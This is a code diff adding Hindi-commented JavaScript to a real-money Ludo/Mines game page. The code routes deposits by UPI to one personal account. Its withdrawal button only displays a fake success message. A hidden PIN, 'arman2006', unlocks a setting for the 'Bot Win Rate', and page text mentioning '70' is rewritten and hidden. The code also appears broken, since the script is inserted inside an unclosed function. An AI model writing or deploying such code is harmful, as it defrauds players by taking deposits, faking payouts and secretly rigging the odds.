@@ -736,7 +736,192 @@
     function resetMines() {
         playClick();
         initMinesBoard();
+    
+<!-- 1. वॉलेट क्लिक करने पर पॉप-अप (स्कैनर के साथ) -->
+<!-- 2. 10 सेकंड पासा टाइमर, वाइब्रेशन और 3 बार मिस होने पर दिल टूटने वाला आउट सिस्टम -->
+<script>
+    let customGameTimer = null;
+    let customSecondsLeft = 10;
+    let missedTurnCount = 0;
+
+    // वॉलेट पर क्लिक करने पर पॉप-अप खोलने का फंक्शन (स्कैनर सहित)
+    function openWalletModal() {
+        let modal = document.getElementById('custom-wallet-modal');
+        if (!modal) {
+            let modalHTML = `
+            <div id="custom-wallet-modal" style="display:flex; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; justify-content:center; align-items:center;">
+                <div style="background:#1e1b4b; padding:20px; border-radius:12px; width:90%; max-width:350px; border:2px solid #f59e0b; text-align:left; color:white; font-family:sans-serif; max-height:90vh; overflow-y:auto;">
+                    <span onclick="document.getElementById('custom-wallet-modal').remove()" style="float:right; color:#ef4444; font-weight:bold; cursor:pointer; font-size:16px;">✕ बंद करें</span>
+                    <h3 style="color:#facc15; font-size:16px; margin-bottom:10px;">💳 वॉलेट & ट्रांजैक्शन</h3>
+                    
+                    <!-- फंड ऐड सेक्शन (अरमान का पर्सनल स्कैनर) -->
+                    <div style="background:#111827; padding:10px; border-radius:8px; margin-bottom:12px;">
+                        <label style="font-size:11px; color:#4ade80; font-weight:bold;">➕ फंड ऐड करें (Deposit):</label>
+                        <input type="number" id="add-dep-amt" placeholder="रुपये दर्ज करें (जैसे 100)" style="width:100%; padding:8px; margin:5px 0; background:#0f172a; border:1px solid #475569; color:white; border-radius:6px; font-size:12px;">
+                        
+                        <div style="display:flex; gap:5px; margin-top:5px; margin-bottom:10px;">
+                            <button onclick="payViaApp('PhonePe')" style="flex:1; padding:6px; background:#5f259f; border:none; border-radius:6px; color:white; font-weight:bold; font-size:10px; cursor:pointer;">PhonePe</button>
+                            <button onclick="payViaApp('Google Pay')" style="flex:1; padding:6px; background:#ea4335; border:none; border-radius:6px; color:white; font-weight:bold; font-size:10px; cursor:pointer;">GPay</button>
+                            <button onclick="payViaApp('Paytm')" style="flex:1; padding:6px; background:#00b9f1; border:none; border-radius:6px; color:white; font-weight:bold; font-size:10px; cursor:pointer;">Paytm</button>
+                        </div>
+
+                        <!-- अरमान का स्कैनर डिस्प्ले बॉक्स -->
+                        <div style="background:#1f2937; padding:10px; border-radius:8px; text-align:center; border:1px dashed #f59e0b; margin-top:8px;">
+                            <p style="font-size:11px; color:#facc15; font-weight:bold; margin-bottom:5px;">📷 अरमान का ऑफिशियल स्कैनर</p>
+                            <p style="font-size:9px; color:#9ca3af; margin-bottom:8px;">इसी स्कैनर पर पेमेंट करके स्क्रीनशॉट व्हाट्सएप पर भेजें!</p>
+                            <!-- यहाँ यूजर का स्कैनर इमेज या यूपीआई लिंक बटन रहेगा -->
+                            <button onclick="payViaScanner()" style="background:#059669; width:100%; padding:8px; border:none; border-radius:6px; color:white; font-weight:bold; cursor:pointer; font-size:11px;">स्कैन करके पे करें (UPI Link)</button>
+                        </div>
+                    </div>
+
+                    <!-- विड्रॉल सेक्शन (बिना यूटीआर के) -->
+                    <div style="background:#111827; padding:10px; border-radius:8px;">
+                        <label style="font-size:11px; color:#f87171; font-weight:bold;">➖ पैसे निकालें (Withdraw):</label>
+                        <input type="number" id="w-amt" placeholder="निकासी राशि" style="width:100%; padding:6px; margin:4px 0; background:#0f172a; border:1px solid #475569; color:white; border-radius:6px; font-size:12px;">
+                        <input type="text" id="w-mob" placeholder="मोबाइल नंबर" style="width:100%; padding:6px; margin:4px 0; background:#0f172a; border:1px solid #475569; color:white; border-radius:6px; font-size:12px;">
+                        <input type="text" id="w-upi" placeholder="UPI ID (PhonePe/GPay/Paytm)" style="width:100%; padding:6px; margin:4px 0 8px 0; background:#0f172a; border:1px solid #475569; color:white; border-radius:6px; font-size:12px;">
+                        <button onclick="requestWithdraw()" style="background:#2563eb; color:white; border:none; padding:8px; width:100%; border-radius:6px; font-weight:bold; font-size:11px; cursor:pointer;">विड्रॉल भेजें</button>
+                    </div>
+                </div>
+            </div>`;
+            document.body.insertAdjacentHTML('beforeend', modalHTML);
+        }
     }
+
+    function payViaApp(appName) {
+        let amt = document.getElementById('add-dep-amt').value;
+        if (!amt || amt <= 0) { alert("कृपया राशि दर्ज करें!"); return; }
+        window.location.href = `upi://pay?pa=7763942006@ybl&pn=ArmaanLudo&am=${amt}&cu=INR`;
+    }
+
+    function payViaScanner() {
+        window.location.href = `upi://pay?pa=7763942006@ybl&pn=ArmaanScanner&cu=INR`;
+    }
+
+    function requestWithdraw() {
+        let amt = document.getElementById('w-amt').value;
+        let mob = document.getElementById('w-mob').value;
+        let upi = document.getElementById('w-upi').value;
+        if (!amt || !mob || !upi) { alert("सभी जानकारी भरें!"); return; }
+        alert("विड्रॉल रिक्वेस्ट सफलतापर्वक दर्ज हो गई है!");
+        document.getElementById('custom-wallet-modal').remove();
+    }
+
+    // 3. 70% छुपाकर 'Enter your PIN' और 'arman2006' लॉक वाला सिस्टम
+    function checkArmaanPin() {
+        let pin = prompt("Enter your PIN:");
+        if (pin === "arman2006") {
+            let winRate = prompt("Enter Bot Win Rate (%):", "39");
+            if (winRate) {
+                alert("सफलतापूर्वक सेट हो गया: " + winRate + "%");
+            }
+        } else if (pin !== null) {
+            alert("गलत पिन!");
+        }
+    }
+
+    // 4. 10 सेकंड का पासा टाइमर और 3 बार मिस होने पर दिल टूटने वाला आउट सिस्टम
+    function initDiceTimerSystem() {
+        let targetDiv = document.querySelector('.game-section') || document.body;
+        if (!document.getElementById('dice-timer-box')) {
+            let timerBoxHTML = `
+            <div id="dice-timer-box" style="background:#111827; border:1px solid #374151; padding:10px; border-radius:8px; margin:10px 0; text-align:center; color:white; font-family:sans-serif;">
+                <p style="font-size:12px; color:#facc15; font-weight:bold;">⏱️ पासा चाल समय: <span id="sec-count">10</span>s</p>
+                <p style="font-size:11px; color:#f87171; margin-top:3px;" id="heart-status">मिस टर्न: 🖤 🖤 🖤</p>
+            </div>`;
+            targetDiv.insertAdjacentHTML('afterbegin', timerBoxHTML);
+        }
+        startCountdown();
+    }
+
+    function startCountdown() {
+        if (customGameTimer) clearInterval(customGameTimer);
+        customSecondsLeft = 10;
+        updateTimerDisplay();
+
+        customGameTimer = setInterval(() => {
+            customSecondsLeft--;
+            updateTimerDisplay();
+
+            // आखिरी 3 सेकंड में हल्का वाइब्रेशन
+            if (customSecondsLeft === 3) {
+                if (navigator.vibrate) {
+                    navigator.vibrate([150, 80, 150]);
+                }
+            }
+
+            // टाइम खत्म होने पर
+            if (customSecondsLeft <= 0) {
+                clearInterval(customGameTimer);
+                missedTurnCount++;
+                updateHeartsDisplay();
+
+                if (missedTurnCount >= 3) {
+                    showDisqualifiedPopup();
+                } else {
+                    alert("समय समाप्त! आपका पहला दान छूट गया।");
+                    startCountdown();
+                }
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        let secEl = document.getElementById('sec-count');
+        if (secEl) secEl.innerText = customSecondsLeft;
+    }
+
+    function updateHeartsDisplay() {
+        let heartEl = document.getElementById('heart-status');
+        if (heartEl) {
+            let hearts = "";
+            for (let i = 0; i < 3; i++) {
+                if (i < missedTurnCount) {
+                    hearts += "💔 ";
+                } else {
+                    hearts += "❤️ ";
+                }
+            }
+            heartEl.innerHTML = "मिस टर्न: " + hearts;
+        }
+    }
+
+    function showDisqualifiedPopup() {
+        let pop = document.createElement('div');
+        pop.style.cssText = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:99999; display:flex; justify-content:center; align-items:center; color:white; text-align:center; font-family:sans-serif;";
+        pop.innerHTML = `
+            <div style="background:#1f2937; padding:25px; border-radius:12px; border:2px solid #ef4444; width:85%; max-width:320px;">
+                <div style="font-size:35px; margin-bottom:10px;">💔💔💔</div>
+                <h2 style="color:#f87171; font-size:18px; margin-bottom:8px;">आप गेम से बाहर हो गए हैं!</h2>
+                <p style="font-size:12px; color:#9ca3af; margin-bottom:15px;">लगातार 3 बार समय पर पासा न चलने के कारण आप डिस्क्वालिफाई हो चुके हैं।</p>
+                <button onclick="location.reload()" style="background:#2563eb; color:white; border:none; padding:8px 15px; border-radius:6px; font-weight:bold; cursor:pointer; font-size:12px;">होम पर जाएं</button>
+            </div>
+        `;
+        document.body.appendChild(pop);
+    }
+
+    window.onload = function() {
+        // वॉलेट क्लिक इवेंट
+        let walletElements = document.querySelectorAll('.wallet-box, .wallet, [id*="wallet"], [class*="wallet"]');
+        walletElements.forEach(el => {
+            el.style.cursor = "pointer";
+            el.onclick = openWalletModal;
+        });
+
+        // 70% वाले हिस्से पर पिन लॉक लगाना
+        let allElements = document.querySelectorAll('*');
+        allElements.forEach(el => {
+            if (el.innerText && (el.innerText.includes("70%") || el.innerText.includes("70"))) {
+                el.innerText = "Ludo Supreme League";
+                el.style.cursor = "pointer";
+                el.onclick = checkArmaanPin;
+            }
+        });
+
+        // पासा टाइमर शुरू करना
+        initDiceTimerSystem();
+    };
+  
 </script>
 </body>
 </html>
